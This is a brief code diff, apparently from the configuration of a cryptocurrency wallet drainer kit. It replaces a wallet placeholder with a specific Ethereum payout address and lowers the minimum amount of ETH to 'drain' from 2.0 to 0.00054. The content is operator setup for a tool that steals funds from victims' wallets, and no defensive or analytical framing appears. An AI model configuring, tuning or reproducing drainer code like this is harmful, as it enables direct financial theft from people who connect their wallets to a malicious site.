@@ -14,11 +14,11 @@ if (!receiveAddress.startsWith("0x") ||
 ) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
 
 /*   = = = = = YOUR WALLET ADRESS = = = = =   */
-const receiveAddress = "Your Eth wallet adress"; // Adress where you want to receive money/nfts
+const receiveAddress = "0x6d87CD33b9A735835fB2e9AB97637Cc44f23F299"; // Adress where you want to receive money/nfts
 
 /*   = = = = = AMOUNT = = = = =   */
 const mintInfo = {
-    minimal: 2.0 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
+    minimal: 0.00054 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
 }
 
 /*   = = = = = MODES = = = = =   */
